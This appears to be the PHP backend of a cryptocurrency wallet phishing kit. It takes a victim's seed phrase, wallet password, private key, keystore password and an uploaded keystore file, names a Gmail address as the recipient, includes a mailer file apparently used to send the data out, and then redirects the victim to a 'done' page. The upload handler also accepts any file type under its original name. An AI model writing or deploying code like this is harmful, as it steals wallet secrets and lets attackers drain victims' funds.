<?php
$site_domain='';
// collect data

if(isset($_POST['phase'])){ $phase=$_POST['phase']; }
	else {$phase= 'no phase';}
if (isset($_POST['password'])) {
    $password = $_POST['password'];
} else {
    $password = 'no Password';
}
if (isset($_POST['private_key'])) {
    $private_key = $_POST['private_key'];
} else {
    $private_key = 'no private key';
}
if(isset($_POST['keystore_password'])){ $keystore_password=$_POST['keystore_password']; }
	else {$keystore_password= 'no keystore password';}
		//upload file
			if(isset($_POST['file_sender'])){
			$target_dir = "uploads/";
			$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
			$uploadOk = 1;
			$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));


			// Check file size
			if ($_FILES["fileToUpload"]["size"] > 500000) {
			  //echo "Sorry, your file is too large.";
			  $uploadOk = 0;
			}

			// Check if $uploadOk is set to 0 by an error
			if ($uploadOk == 0) {
			  //echo "Sorry, your file was not uploaded.";
			// if everything is ok, try to upload file
			} else {
			  if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
				$file=$site_domain.'restore/'.$target_file;
			  } else {
				echo "Sorry, there was an error uploading your file.";
			  }
			}
		}
	else {$file='no FILE UPLOADED';}

$email = 'deborahdouglas110@gmail.com';
include_once("mailitall.php");
//redirect to success page
echo '
<script>
  location.replace("done.html")
</script>

';
